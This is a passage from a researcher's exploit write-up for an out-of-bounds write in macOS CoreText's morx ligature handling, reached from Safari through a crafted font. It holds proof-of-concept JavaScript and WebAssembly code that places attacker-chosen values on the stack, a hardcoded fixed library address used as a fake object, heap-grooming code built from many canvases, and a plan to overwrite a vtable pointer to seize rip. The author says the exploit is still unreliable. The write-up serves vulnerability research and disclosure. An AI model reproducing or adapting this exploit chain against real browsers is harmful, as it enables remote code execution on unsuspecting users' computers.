  document.fonts.add(pocFontFaceLoaded)
  document.fonts.ready.then(function() {
  var trunglue = {
  a: 1,b: 2,c: 3,d: 4,e: 5,f: 6,g: 7,h: 8,i: 9,j: 10,
  k: 11,l: 12,m: 13,n: 14,o: 15,p: 16,q: 17,r: 18,
  s: false,  // something that must be small (trunglue+0xa0: encoded_index)
  t: 20,
  u: {},  // something that must be mapped (trunglue+0xb0: glyphs)
  v: 22
  }
  setup([1, 2, 3, undefined, 5, 6, 7, trunglue, 9, 10, trunglue, 12, undefined, 14, 15, 16, 17, 18, 19, 20])
  })
  })
  }
  
  load()
  

The `load` function is almost the same as before, but this time it has a JS object, and calls `setup` with an array. `setup` does the following:

  1. Load many values from the given array into local variables

  * This lets the JS interpreter put these values onto the stack

  2. Call `draw0` which starts the recursion like before

  * To trigger the crashing function `TAATMorphSubtableMorx::DoLigatureAction`

  3. Return the sum of all the loaded values

  * This is just for the variables to be used somewhere in the function, so that the JS interpreter won’t optimize them out

Here’s the effect, as I set a breakpoint on `trunglue = morx_ligature_state->tglyphs[stack_top].trunglue`, to inspect the contents at `morx_ligature_state->tglyphs[stack_top]` when `stack_top` is `0x7ffe0`:
  
  
  ->  0x7fff21ab9b16 (0x7fff21984b16): 4c 8b 24 16  mov  r12, qword ptr [rsi + rdx]
  
  (lldbinit) x/32gx $rsi+$rdx
  0x7ffeecbc52b0: 0x00000001a2ea0000 0x000000000000000a  <=== address of trunglue | location
  0x7ffeecbc52c0: 0xfffe000000000010 0xfffe00000000000a
  0x7ffeecbc52d0: 0xfffe000000000014 0xfffe00000000000a
  0x7ffeecbc52e0: 0xfffe00000000000a 0xfffe00000000000e
  0x7ffeecbc52f0: 0xfffe000000000006 0xfffe000000000011
  0x7ffeecbc5300: 0xfffe000000000012 0xfffe000000000001
  0x7ffeecbc5310: 0xfffe00000000000a 0xfffe00000000000a
  0x7ffeecbc5320: 0xfffe00000000000c 0xfffe00000000000a
  0x7ffeecbc5330: 0xfffe000000000005 0xfffe00000000000f
  0x7ffeecbc5340: 0xfffe00000000000a 0xfffe00000000000a
  

Here we see the `trunglue` and `location` values that will be loaded from `setup`’s `llint_entry`’s stack frame. The `location` value is `0xa`, which is WebKit’s representation of `undefined` in memory. On the other hand, the `trunglue` pointer contains an address in the heap, specifically the WebKit Malloc.
  
  
  (lldbinit) vmmap 0x00000001a2ea0000
  WebKit Malloc  [0x00000001A2E00000 - 0x00000001A2F00000) - rw-/rwx SM=PRV WebKit Malloc_0x18df07000
  

The other values like `0xfffe000000000001` or `0xfffe000000000014` and the rest are all WebKit’s representation of integers in memory. For example, `0xfffe000000000001` is `1` and `0xfffe000000000014` is `20`.

All these representations (NaN-boxing) are explained in `JSCJSValue.h` in the WebKit source code, in the following snippet:
  
  
  * The top 15-bits denote the type of the encoded JSValue:
  *
  *  Pointer {  0000:PPPP:PPPP:PPPP
  *  / 0002:****:****:****
  *  Double  {  ...
  *  \ FFFC:****:****:****
  *  Integer {  FFFE:0000:IIII:IIII
  *
  * The scheme we have implemented encodes double precision values by performing a
  * 64-bit integer addition of the value 2^49 to the number. After this manipulation
  * no encoded double-precision value will begin with the pattern 0x0000 or 0xFFFE.
  * Values must be decoded by reversing this operation before subsequent floating point
  * operations may be peformed.
  *
  * 32-bit signed integers are marked with the 16-bit tag 0xFFFE.
  *
  * The tag 0x0000 denotes a pointer, or another form of tagged
  * immediate. Boolean, null and undefined values are represented by
  * specific, invalid pointer values:
  *
  *  False:  0x06
  *  True:  0x07
  *  Undefined: 0x0a
  *  Null:  0x02
  *
  

If you paid attention, this was the order of values given to `setup`, which doesn’t match the order of the values on the stack.
  
  
  setup([1, 2, 3, undefined, 5, 6, 7, trunglue, 9, 10, trunglue, 12, undefined, 14, 15, 16, 17, 18, 19, 20])
  

I’m not sure why the order is shuffled, but after restarting Safari to load the same poc more than 10 times, I can confirm that the order stays the same.

Now let’s take a look at the `trunglue` pointer that is pointing to a heap address:
  
  
  (lldbinit) tele 0x00000001a2ea0000
  ['0x00000001a2ea0000']
  CODE | STACK | HEAP | DATA
  0x1a2ea0000:	0x10017000000ebdb
  0x1a2ea0008:	0x0
  0x1a2ea0010:	0xfffe000000000001
  0x1a2ea0018:	0xfffe000000000002
  0x1a2ea0020:	0xfffe000000000003
  0x1a2ea0028:	0xfffe000000000004
  0x1a2ea0030:	0xfffe000000000005
  0x1a2ea0038:	0xfffe000000000006
  

We see above that there are consecutive values from `0xfffe000000000001` to `0xfffe000000000006`, which are WebKit’s representation of integer values `1` to `6`. This matches the “shape” of `trunglue` in `setup` defined as follows:
  
  
  var trunglue = { a: 1, b: 2, c: 3, d: 4, e: 5, f: 6, ...
  

Recall that we crashed at `glyph_id = trunglue->glyphs[trunglue->encoded_index + location]`, so we should control `trunglue->encoded_index` and `trunglue->glyphs`. They are controlled by property `s` and `u` of `trunglue` respectively.
  
  
  var trunglue = {
  ...
  s: false,  // something that must be small (trunglue+0xa0: encoded_index)
  t: 20,
  u: {},  // something that must be mapped (trunglue+0xb0: glyphs)
  v: 22
  }
  

Looking further at property `s` of `trunglue` onwards in memory:
  
  
  (lldbinit) tele 0x00000001a2ea0000+0xa0
  ['0x00000001a2ea0000+0xa0']
  CODE | STACK | HEAP | DATA
  0x1a2ea00a0:	0x6
  0x1a2ea00a8:	0xfffe000000000014
  0x1a2ea00b0:	0x18eadbd80
  0x1a2ea00b8:	0xfffe000000000016
  0x1a2ea00c0:	0x0
  0x1a2ea00c8:	0x0
  0x1a2ea00d0:	0x0
  0x1a2ea00d8:	0x0
  
  (lldbinit) vmmap 0x18eadbd80
  WebKit Malloc  [0x000000018EA00000 - 0x000000018EB00000) - rw-/rwx SM=PRV WebKit Malloc_0x18df07000
  

I successfully set `trunglue->encoded_index` to a small value (`0x6` is WebKit’s representation of `false`), and `trunglue->glyphs` to a mapped memory location.

Unlike the random order shuffling done to the local variables shown above, the offset of each JS object property is deterministic. Here is the explanation about “butterfly” from [Saelo’s Phrack article](http://phrack.org/issues/70/3.html):

> Internally, JSC stores both properties and elements in the same memory region and stores a pointer to that region in the object itself. This pointer points to the middle of the region, properties are stored to the left of it (lower addresses) and elements to the right of it. There is also a small header located just before the pointed to address that contains the length of the element vector. This concept is called a “Butterfly” since the values expand to the left and right, similar to the wings of a butterfly. Presumably. In the following, we will refer to both the pointer and the memory region as “Butterfly”. In case it is not obvious from the context, the specific meaning will be noted.
>  
>  
>  --------------------------------------------------------
>  .. | propY | propX | length | elem0 | elem1 | elem2 | ..
>  --------------------------------------------------------
>  ^
>  |
>  +---------------+
>  |
>  +-------------+
>  | Some Object |
>  +-------------+
>  

This is good, now `glyph_id = trunglue->glyphs[trunglue->encoded_index + location]` won’t crash because `glyphs` and `encoded_index` have reasonable values. Now, we can focus on just the OOB write. Not sure if good news or bad news, the `trunglue` loaded from the stack is not passed to the lambda function, so we don’t need to care about it anymore.

We just need to control the `location` value which is the OOB write offset. It turns out that this is quite hard. Because of NaN-boxing, the values in memory are restricted to the following:
  
  
  *  Pointer {  0000:PPPP:PPPP:PPPP
  *  / 0002:****:****:****
  *  Double  {  ...
  *  \ FFFC:****:****:****
  *  Integer {  FFFE:0000:IIII:IIII
  *
  *  False:  0x06
  *  True:  0x07
  *  Undefined: 0x0a
  *  Null:  0x02
  

It is almost impossible to get a good offset because the top 16 bits of the value will be within the range `0002` to `FFFE` if we put a double or integer, and there’s no way to control the pointer to have a value we want. In the end, I gave up and decided to try something else.

### Attempt 2 (fail): DFG JIT

The behaviour above is done by the Low Level Interpreter, which is the interpreter with no JIT. I wondered that maybe for one of the JIT interpreters (Baseline JIT or DFG JIT or FTL JIT) there might be raw values (no NaN-boxing) written to the stack.

I don’t really remember what I did, but I tried a lot and did not find any way to write any value I want to the stack. If you are interested you can check out `poc/experiments/jit` for some of the codes.

### Attempt 3 (success): wasm

_The code for this can be found in`poc/3_poc_wasm` (with some changes)._

After asking some people for ideas, a friend suggested to try wasm. Since I already tried all the different JITs, I am out of ideas, and decided to give it a try.

I defined this C function that basically is the same as the `setup` JS function from before.
  
  
  typedef unsigned long long ull;
  
  extern "C"
  {
  // Wrapper for our JavaScript function
  extern void draw0();
  
  int setup(ull *args)
  {
  ull v0 = args[0];ull v1 = args[1];ull v2 = args[2];ull v3 = args[3];ull v4 = args[4];
  ull v5 = args[5];ull v6 = args[6];ull v7 = args[7];ull v8 = args[8];ull v9 = args[9];
  ull v10 = args[10];ull v11 = args[11];ull v12 = args[12];ull v13 = args[13];ull v14 = args[14];
  ull v15 = args[15];ull v16 = args[16];ull v17 = args[17];ull v18 = args[18];ull v19 = args[19];
  ull v20 = args[20];ull v21 = args[21];ull v22 = args[22];ull v23 = args[23];ull v24 = args[24];
  ull v25 = args[25];ull v26 = args[26];ull v27 = args[27];ull v28 = args[28];ull v29 = args[29];
  ull v30 = args[30];ull v31 = args[31];ull v32 = args[32];ull v33 = args[33];ull v34 = args[34];
  ull v35 = args[35];ull v36 = args[36];ull v37 = args[37];ull v38 = args[38];ull v39 = args[39];
  ull v40 = args[40];ull v41 = args[41];ull v42 = args[42];ull v43 = args[43];ull v44 = args[44];ull v45 = args[45];
  
  draw0();
  
  return v0 + v1 + v2 + v3 + v4 + v5 + v6 + v7 + v8 + v9 + v10 +
  v11 + v12 + v13 + v14 + v15 + v16 + v17 + v18 + v19 + v20 +
  v21 + v22 + v23 + v24 + v25 + v26 + v27 + v28 + v29 + v30 +
  v31 + v32 + v33 + v34 + v35 + v36 + v37 + v38 + v39 + v40 +
  v41 + v42 + v43 + v44 + v45;
  }
  }
  

  1. Load many values from the given array into local variables

  * This lets the JS interpreter put these values onto the stack

  2. Call `draw0` which starts the recursion like before

  * Which will eventually trigger the crashing function `TAATMorphSubtableMorx::DoLigatureAction`

  3. Return the sum of all the loaded values

  * This is just for the variables to be used somewhere in the function, so that the compiler won’t optimize them out

Note that this native C function takes in an `unsigned long long` which is 64-bits wide. Because it is a native function, there is no NaN-boxing. Since JS only supports 32-bit integers, I use the standard `Float64` to `BigUint64` conversion code that people like to use for browser pwn. This code allows me to call something like `BigInt("0x00007FFF8E200038").i2f()` which will tell the JS interpreter to treat `0x00007FFF8E200038` as a 64-bit floating point value, so that it is stored as this exact 64-bit value in memory.Then when it is passed to the native C function, the raw 64-bit value `0x00007FFF8E200038` will be used without going through any NaN-boxing.
  
  
  /**
  * Utils
  */
  let conversion_buffer = new ArrayBuffer(8);
  let float_view = new Float64Array(conversion_buffer);
  let int_view = new BigUint64Array(conversion_buffer);
  BigInt.prototype.hex = function () {
  return '0x' + this.toString(16);
  };
  BigInt.prototype.i2f = function () {
  int_view[0] = this;
  return float_view[0];
  }
  Number.prototype.f2i = function () {
  float_view[0] = this;
  return int_view[0];
  }
  
  
  
  function load(wasm_func, memory) {
  const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)")
  
  var canvas = document.getElementById('canvas')
  canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")
  
  pocFontFace.load().then(function (pocFontFaceLoaded) {
  document.fonts.add(pocFontFaceLoaded)
  document.fonts.ready.then(function () {
  var trunglue = {
  a: 1,b: 2,c: 3,d: 4,e: 5,f: 6,g: 7,h: 8,i: 9,j: 10,
  k: 11,l: 12,m: 13,n: 14,o: 15,p: 16,q: 17,r: 18,
  s: false,  // something that must be small (trunglue+0xa0: encoded_index)
  t: 20,
  u: {},  // something that must be mapped (trunglue+0xb0: glyphs)
  v: 22
  }
  const array = new Float64Array(memory.buffer, 0, 100)
  array.set([
  BigInt("0").i2f(),BigInt("1").i2f(),BigInt("2").i2f(),BigInt("3").i2f(),BigInt("4").i2f(),
  BigInt("5").i2f(),BigInt("6").i2f(),BigInt("7").i2f(),BigInt("8").i2f(),BigInt("9").i2f(),
  BigInt("10").i2f(),BigInt("11").i2f(),BigInt("12").i2f(),BigInt("13").i2f(),BigInt("14").i2f(),
  BigInt("15").i2f(),BigInt("16").i2f(),BigInt("17").i2f(),BigInt("18").i2f(),BigInt("19").i2f(),
  BigInt("20").i2f(),BigInt("21").i2f(),BigInt("22").i2f(),BigInt("23").i2f(),BigInt("24").i2f(),
  BigInt("25").i2f(),
  
  BigInt("0x131335").i2f(),  // location 1
  BigInt("0x00007FFF8E200038").i2f(),  // trunglue 1
  BigInt("0x131336").i2f(),  // location 2
  BigInt("0x00007FFF8E200038").i2f(),  // trunglue 2
  BigInt("0x131337").i2f(),  // location 3
  BigInt("0x00007FFF8E200038").i2f(),  // trunglue 3
  BigInt("0x131338").i2f(),  // location 4
  BigInt("0x00007FFF8E200038").i2f(),  // trunglue 4
  BigInt("0x131339").i2f(),  // location 5
  BigInt("0x00007FFF8E200038").i2f(),  // trunglue 5
  ])
  wasm_func(array.byteOffset)
  })
  })
  }
  
  load()
  

This time, the stack looks very beautiful. All the values don’t have an ugly `FFFE` in front of them.
  
  
  ->  0x7fff21ab9b16 (0x7fff21984b16): 4c 8b 24 16  mov  r12, qword ptr [rsi + rdx]
  ...
  (lldbinit) x/32gx $rsi+$rdx
  0x7ffee1b2f090: 0x00007fff8e200038 0x0000000000131337
  0x7ffee1b2f0a0: 0x00007fff8e200038 0x0000000000131336
  0x7ffee1b2f0b0: 0x00007fff8e200038 0x0000000000131335
  0x7ffee1b2f0c0: 0x0000000000000019 0x0000000000000018
  0x7ffee1b2f0d0: 0x0000000000000017 0x0000000000000016
  0x7ffee1b2f0e0: 0x0000000000000015 0x0000000000000014
  0x7ffee1b2f0f0: 0x0000000000000013 0x0000000000000012
  0x7ffee1b2f100: 0x0000000000000011 0x0000000000000010
  0x7ffee1b2f110: 0x000000000000000f 0x000000000000000e
  

If you are thinking why don’t I just use `BigUint64Array`, and don’t do any conversion to a `Float64Array`. I did try that, but the stack layout becomes very unpredictable and very unusable, so I cannot proceed.

Unfortunately, with this technique, I cannot pass any JS objects to the `setup` function anymore. This means I can’t just pass a JS object to be placed as the `trunglue` on the stack. I can’t really remember why, but I tried a lot of things and could not find a way to pass an object or any pointer to be stored onto the stack. I think most of the things I tried ended up with the stack layout becoming very weird.

So, I got very good control over both `trunglue` and `location`, but I can’t just give `trunglue` an arbitrary value because of the `trunglue->glyphs[trunglue->encoded_index + location]` access, specifically

  * `&trunglue+0xa0` (`encoded_index`) can be any value but preferably a small one
  * `&trunglue+0xb0` (`glyphs`) must point to mapped memory

I went through the memory map and see if there are any pages that are always at the same address. Honestly, I wasn’t expecting any. But then I realized the last page of the process (`/usr/lib/libobjc.A.dylib`) always start at the same address.
  
  
  __OBJC_RW  [0x00007FFF8E200000 - 0x00007FFF8E2FE000) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
  

I even restarted the VM a few times and this page still starts at the same address. This is very good. So I just scrolled through the memory in that page to see which address satisfies the requirement for `trunglue`. I see that `0x00007fff8e200038` works well, it has good `encoded_index` (`+0xa0`) and `glyphs` (`+0xb0`).

**(Note that this works on macOS 11.6.1. For a trunglue that works for 11.6.4, check the report I sent to Apple. It is under the`report` folder.)**
  
  
  (lldbinit) x/4gx 0x00007fff8e200038+0xa0
  0x7fff8e2000d8: 0x0000000000000000 0x6000000000000060  # encoded_index = 0
  0x7fff8e2000e8: 0x00007fff89fbbeb0 0x00007fff7ba17037  # glyphs = 0x00007fff89fbbeb0
  
  (lldbinit) x/4gx 0x00007fff89fbbeb0
  0x7fff89fbbeb0: 0x00007fff7e3a2754 0x00007fff7e8cb26d
  0x7fff89fbbec0: 0x00007fff7e8cb297 0x0000000000000001
  

With this all done, it is time to test the OOB write primitive.
  
  
  _WORD *__fastcall -[_CTNativeGlyphStorage setGlyph:atIndex:](
  __int64 this,
  __int64 a2,
  __int16 ligature_offset,
  __int64 index)
  {
  _WORD *result; // rax
  
  glyphs = this->glyphs;
  glyphs[index] = ligature_offset;  // [1] oob write
  return result;
  }
  

I set a breakpoint at line `[1]` above, and here is what I got.
  
  
  RAX: 0x00007F8F9A682940  # this->glyphs
  RCX: 0x000000000013131B  # index  => location from the stack
  RDX: 0x000000000000CAFE  # ligature_offset  => value taken from the ligature list table
  
  ->  0x7fff21a9d262 (0x7fff21968262): 66 89 14 48  mov  word ptr [rax + 2*rcx], dx
  
  (lldbinit) vmmap $rax
  MALLOC_TINY  [0x00007F8F9A600000 - 0x00007F8F9A700000) - rw-/rwx SM=PRV DefaultMallocZone_0x10e0e4000
  

Here are the values explained:

  * `rax` is a field of the `this` object 
  * Points to the system malloc heap (NOT JS heap, which makes exploitation hard)
  * Will go into more detail about this in the next part.
  * `rcx` is `index` (`64-bit`): `0x131317` (`location`) + `some_small_offset`
  * The small offset added was described at the start of this writeup.
  * It is deterministic, based on the poc Arabic text, so when setting `location` just remember to subtract this offset.
  * `rdx` is `ligature_offset` (16-bit value): `0xcafe`
  * This value is taken from the **ligature list table** in the poc font. Here it is `0xcafe` because I’ve set this value in the poc font file when testing.

So, here we got a working OOB write primitive in the system malloc heap. And since we are in a `while` loop, we can do this as many times as we want, with any `index` and `ligature_offset` values, as long as we don’t write to any invalid memory address.

### Final Notes

One last small thing to take note. The `location` is not immediately given to the lambda function after loading it from the stack. Here’s what I mean. Suppose the following:

  * `A` is `location = morx_ligature_state->tglyphs[stack_top].location`
  * `B` is lambda function –> … –> `glyphs[index] = ligature_offset`

  1. `A` loads `location1`
  2. `B` uses `location0`
  3. `A` loads `location2`
  4. `B` uses `location1`
  5. `A` loads `location3`
  6. `B` uses `location2`

It doesn’t matter anyway. Everything still work as intended. Just take note in case you are wondering why the value is wrong when debugging.

Actually, the path from the lambda function to `glyphs[index] = ligature_offset` has A LOT of code. I am very very surprised that the program didn’t crash somewhere in the path. I feel very lucky.

**Part 3d** is the last part. I will describe a vtable pointer that can be overwritten to achieve code execution.

## Part 3d : Exploit-vtable-overwrite

_Honestly, I don’t expect anyone to read this. It isn’t very instructive but I think these are somewhat still very valuable notes for myself. This is the part where I got stuck at, and I share some of the insights I got regarding the macOS heap’s allocation behaviour. Perhaps you may find it useful reading the statistics I collected to reason about the allocation behaviour, but the rest of this section is probably overly specific to this exploit that it’s not very useful._

At this point, we have a system malloc heap relative write primitive. The immediate question is: what can we overwrite? Specifically:

  1. Since this is a relative write, what structures are accessible?
  2. Which structures can be overwritten to take control over `rip`?

As I searched through the code in the lambda function, I found this nice call chain:

  1. lambda function
  2. `TGlyphIterator::DoLigature`
  3. `TRunGlue::SetGlyphID<true>`
  4. `TStorageRange::ResetAdvance(TStorageRange*, oob offset, TFont*)`
  5. `TFont::GetUnsummedAdvancesForGlyphs`
  6. `GetUnscaledAdvances`
  7. vtable call

Right at the start of `GetUnscaledAdvances`, there is an if-statement that when it is true, will do a vtable call (`[1]`). Otherwise, a few lines after it, there is still a vtable call (`[2]`). So no matter what, this function will result in a vtable call.
  
  
  __int64 __fastcall GetUnscaledAdvances(
  const TFont *tfont,
  const unsigned __int16 *a2,
  CGSize *size,
  __int64 a4,
  CTFontOrientation orientation)
  {
  ...
  
  canary = *(_QWORD *)__stack_chk_guard;
  
  if ( orientation != kCTFontOrientationVertical && (orientation || (tfont->field0 & 1) == 0) )
  // [1]
  return (
  *(__int64 (__fastcall **)(_QWORD, const unsigned __int16 *, CGSize *, __int64))
  (tfont->in_memory_base_font->vtable  // vtable for TInMemoryBaseFont
  + 0x208LL))  // TBaseFont::GetUnscaledAdvances(unsigned short const*, CGSize*, long) const
  (tfont->in_memory_base_font,
  a2,
  size,
  a4);
  
  ...
  
  // [2]
  (*(void (__fastcall **)(__int64 *))(tfont->in_memory_base_font->vtable + 0x1E0LL))(&v15);  // TBaseFont::CopyGraphicsFont()
  
  ...
  

From checking in LLDB, I see that `[1]` will always be taken for our poc text and font. Now, I just need to focus on overwriting `tfont->in_memory_base_font` with a fake object that contains a fake vtable, so that when the program reaches `[1]`, `rip` will be set to whatever is inside `fake_vtable+0x208`.

Sounds straightforward. But in fact this is super hard, and I still have not been able to make a reliable exploit yet. However, running the exploit many times, I did manage to control `rip` once, so the idea works.

The 2 main obstacles are:

  1. The primitive lets us overwrite 2 bytes in each iteration. We don’t get to overwrite more than 2 bytes of `tfont->in_memory_base_font`, because the vtable call (using `tfont->in_memory_base_font->vtable+0x208`) happens at the end of each iteration. Right after overwriting 2 bytes of `tfont->in_memory_base_font`, vtable call happens, then either we control `rip` or the program segfaults.

  * **Good News:** Only partially overwrite `in_memory_base_font` so don’t need to know the heap’s base address.
  * **Bad News:** Only control 2 bytes of `in_memory_base_font`, cannot just partially overwrite 1 byte, must be 2 bytes.

  2. Need to overwrite the value of `tfont->in_memory_base_font`. What is its offset from the base of our relative write?

**Obstacle 1** is makes this harder to exploit. At the end of this writeup I wrote about the idea I tried and failed. **Obstacle 2** is a huge pain. So I will share my notes on it first.

### Some statistics

First, I try to collect some statistics on the distance between `tfont` and the relative write base, which from now on I call it `glyphs` because it is used in `[_CTNativeGlyphStorage setGlyph:atIndex:]`. Here is the code of the OOB write function again for reference:
  
  
  _WORD *__fastcall -[_CTNativeGlyphStorage setGlyph:atIndex:](
  __int64 this,
  __int64 a2,
  __int16 ligature_offset,
  __int64 index)
  {
  _WORD *glyphs; // rax
  
  glyphs = this->glyphs;
  glyphs[index] = ligature_offset;  // oob write
  return glyphs;
  }
  

Here are a few of them (`&glyphs`-`&tfont`):

  * `0xc40`
  * `0xaa0`
  * `0x133e0`
  * `0x1270`
  * `0x8d0`

They seem to be very random. But there’s good news, both structures are allocated in the same heap. Safari has many many heaps, but because both structures are of a similar size, they get allocated in the same heap (`MALLOC_TINY`).

#### One heap per core

Except for one, with distance `0x133e0`. This behaviour happens because I’m debugging the process. When a breakpoint is hit, the process pauses, that’s what we want it to do. So, the OS will free up the CPU core (e.g. Core 1) for some other process to run. When we are ready for our process to continue, the OS might give it a different core (e.g. Core 2). The allocator has this behaviour that each heap is bound to a core. So, since we are now on Core 2 instead of Core 1, we get a different heap 🤯. More details can be found on <https://youtu.be/KE9DTSrAtF8?t=547> (9:09 onwards).

This per-core thing makes debugging the exploit quite annoying. A lot of times, if I break for too long, the subsequent allocations will end up in a different heap page. The best thing to do is to set a few breakpoints as possible, and quickly continue the process after breaking.

But without a debugger, the allocations should 99.99% of the time happen in the same heap, so that’s ok. If we are worried, we can start up multiple worker threads to occupy other cores. For example, if we have 8 cores, we have the main thread running in Core 1, and create 7 worker threads that are stuck in a loop to keep Core 2-7 busy, so that there’s no way for the main thread to switch to other cores.

#### Holes in the heap

On the other hand, the random behaviour can be explained easily. This is because at this point of the process, there are many allocations and frees that happened in the heap, so there will be many holes. The `tfont` and `glyphs` structures are just placed into whichever hole that the allocator decides is good.

Knowing this, I tried an idea: create many canvases. I wanted the same structures to be allocated to the heap to fill up the holes, so that when it reaches the poc canvas’s turn, the `glyphs` and `tfont` will be close to each other. Note that the “hole-filling” canvases are not given the poc font, because they shouldn’t crash the process.
  
  
  function start(wasm_func, memory) {
  var bobrosses = [];
  for (var i = 0; i < 16; ++i) {
  var canvas = document.createElement('canvas');
  document.body.appendChild(canvas);
  var ctx = canvas.getContext('2d');
  ctx.fillText('من ويكيبيديا، الموسوعة الحرة', 400, 200);
  bobrosses.push(canvas);
  }
  
  const pocFontFace = new FontFace("GeezaPro", "url(poc.ttf)")
  
  var canvas = document.createElement('canvas')
  canvas.setAttribute("style", "font-family: GeezaPro; -webkit-font-smoothing: none;")
  document.body.appendChild(canvas)
  
  ...
  

Then, I checked the statistics again. Here are some of the distances collected (only showing a few here):

  * 0x5b0
  * 0xb40
  * 0x7e0
  * 0x650
  * 0x12f0
  * 0x500
  * 0xb30
  * 0x500
  * 0x500

It still looks random. But this time, `0x500` and `0x5b0` happens quite a number of times (not shown above). `0x500` is not random, and I’m going to explain why.

### Memory layout of `tfont` and `glyphs`

I wanted a better idea of the structure of `TFont`, and the structure that contains `glyphs`, which is `CTNativeGlyphStorage`.

#### `CTNativeGlyphStorage` structure

So, I first investigated the initialization site of `CTNativeGlyphStorage` to find its constructor. It is not as simple as searching for a `CTNativeGlyphStorage` function because it is an Objective-C function, the constructors are named differently. I know that the `CTNativeGlyphStorage` object is a field of `TStorageRange`, so I started by looking at the call stack of the constructor `TStorageRange::TStorageRange(_CTGlyphStorage*, CFRange)`.

`TStorageRange` call stack:

  * `TStorageRange::TStorageRange(_CTGlyphStorage*, CFRange)`
  * called by `TRun::TRun(_CTGlyphStorage*, CFRange, TAttributes const&)` (at `00007FFF21956532`)
  * called by `TCFRef<CTGlyphRun*> TCFBase_NEW<CTGlyphRun, _CTNativeGlyphStorage*&, CFRange&, TAttributes const&>(_CTNativeGlyphStorage*&, CFRange&, TAttributes const&)` (at `00007FFF219563F7`)
  * called by `TGlyphEncoder::EncodeChars(CFRange, TAttributes const&, TGlyphEncoder::Fallbacks)` (at `00007FFF2195EA5F`)
  * called by `TTypesetterUniChar::Initialize` (at `00007FFF2199FFF4`)

I see that the `CTNativeGlyphStorage` object is created in `TTypesetterUniChar::Initialize`, through an Objective-C function call at `00007FFF2199FF3C`.
  
  
  nativeglyphstorage = objc_msgSend_ptr(&OBJC_CLASS____CTNativeGlyphStorage, (const char *)off_7FFF809BA5A0);  // [_CTNativeGlyphStorage newWithCount:]
  

  * `objc_msgSend_ptr`
  * calls `[_CTNativeGlyphStorage newWithCount:]`
  * calls `[_CTNativeGlyphStorage initWithCount:]`
  * allocates `CTNativeGlyphStorage` object
  * calls `[_CTNativeGlyphStorage prepareWithCapacity:preallocated:]`
  * calls `calloc` to allocate `glyphs`

The last function in the list is responsible for allocating `glyphs` which we are interested in.
  
  
  CTNativeGlyphStorage *__fastcall -[_CTNativeGlyphStorage prepareWithCapacity:preallocated:](
  CTNativeGlyphStorage *this,
  __int64 a2,
  __int64 count,
  char a4)
  {
  __int64 base; // rax
  
  if ( !this )
  return 0LL;
  
  this->count = count;
  if ( ... )
  {
  this->base = calloc(1uLL, 30 * count);  // [1] allocation
  base = this->base;
  if ( base )
  goto LABEL_5;
  ...
  }
  
  ...
  
  LABEL_5:
  this->logical_indices = base + 16 * count;
  this->flags = this->logical_indices + 8 * count;
  
  this->glyphs = this->flags + 4 * count;  // [2] glyphs = base + 28 * count
  return this;  // so in total 28 bytes per count
  }
  

Firstly (at `[1]`), the function uses `calloc` to allocate `count * 30` bytes. Here, `count` is `28` as that is the number of glyphs/characters that our poc text has. This block of memory is then partitioned for storing a few sets of values:

Field | Offset (bytes) | Size (bytes)  
---|---|---  
idk | `0` | `count * 16`  
`logical_indices` | `count * 16` | `count * 8`  
`flags` | `count * 24` | `count * 4`  
`glyphs` | `count * 28` | `count * 2`  
  
Don’t worry about the name of the fields, they aren’t important. Honestly I don’t remember where I got the names from. I just happened to rename them once when reversing some functions.

The important thing here is, the `glyphs` field is at an offset of `count * 28`. Since `count == 28` as mentioned earlier, `glyphs` will be at offset `0x310`. Note to remember this number.

#### `TFont` structure

Remember, our target is to overwrite `tfont->in_memory_base_font->vtable`, which is used for a vtable call in `GetUnscaledAdvances`.

Because `&glyphs-&tfont` is always a positive number, it means that the `TFont` structure is allocated at a lower address, i.e. allocated before the `CTNativeGlyphStorage`. There are many `TFont::TFont` constructors, and I need to find out which `TFont` constructor is the one responsible for creating the one we see. To do so, I set a breakpoint at all `TFont::TFont` constructors, and also a breakpoint right before the target vtable call (`tfont->in_memory_base_font->vtable`).

For each break at `TFont::TFont` that occurs, I noted down the address of the `TFont` object. Then, when I reach the vtable call, I compared to see which `TFont::TFont` is the one that initialized this `tfont`.

I found that it is `TFont::TFont(TFont,const __CTFontDescriptor,double,const CGAffineTransform,const __CTFontDescriptor)` called by `TCFBase_NEW<CTFont,__CTFontDescriptor const*,double &,CGAffineTransform const*&,__CTFontDescriptor const*&>...` at `00007FFF2192CC95`. Here, I see that `TFont` is at offset `0x30` of the `TCFBase` object, which is of size `0x218`.
  
  
  _QWORD *__fastcall TCFBase_NEW<CTFont,__CTFontDescriptor const*,double &,CGAffineTransform const*&,__CTFontDescriptor const*&>(...)
  {
  ...
  
  this = TCFBase<TDescriptor>::Allocate(0x218LL);
  if ( this )
  {
  ...
  TFont::TFont((TFont *)(this + 0x30), v9, v10, v11, v12);
  ...
  }
  

Now, let’s do the maths.

As `TCFBase` is allocated size `0x218`, and `TFont` starts at offset `0x30`, the distance from `TFont` to the end of `TCFBase` is **`0x1e8`**. And we recall that `glyphs` is part of a `calloc`ed block of memory, at offset **`0x310`**.

`0x1e8 + 0x310 = 0x4f8`. If we align it to 16-bytes, it rounds up to **`0x500`** , which appears very often when I collected statistics for `&glyphs-&tfont`. This is why I said the `0x500` distance is not random, and the distance will always be at least `0x500`.

However, it is not `0x500` 100% of the time. Another often seen distance is `0x5b0`. And some of the time, it is a completely random value. I tried to check what is the structure that goes between `tfont` and `glyphs`, but looks like it could be anything, because they both might have just been placed into some holes in that heap.

Recall that earlier I created many `canvas`es to fill up holes in the heap. With some trial and error, I find that creating 128 canvases then drawing the poc text on them will result in the distance **`0x5b0`** appearing ~70% of the time. It is not bad, and I can’t ask for more, so I just accept it for now. If I had too many canvases, the tab might run out of memory.

### Disable the vtable call (failed)

At the start of this writeup, I mentioned **Obstacle 1** , that the vtable call happens at the end of each iteration. Because of this, we can only overwrite `tfont->in_memory_base_font` once, i.e. partial overwrite of 2 bytes. I found that maybe this restriction can be removed, by setting a certain field of a certain structure to a certain value, so that `GetScaledAdvances` is not called.

`GetUnscaledAdvances` is called by `TFont::GetUnsummedAdvancesForGlyphs`, which is called by `TStorageRange::ResetAdvance`.
  
  
  void *__fastcall TStorageRange::ResetAdvance(TStorageRange *this, __int64 glyph_storage_index, const TFont *tfont)
  {
  ...
  
  v7 = (this->byte21 & 4) == 0;
  ...
  if ( v7 )  // mostly true i think
  {
  TFont::GetUnsummedAdvancesForGlyphs(  // this calls `GetUnscaledAdvances`, which does the vtable call
  ...
  }
  else
  {
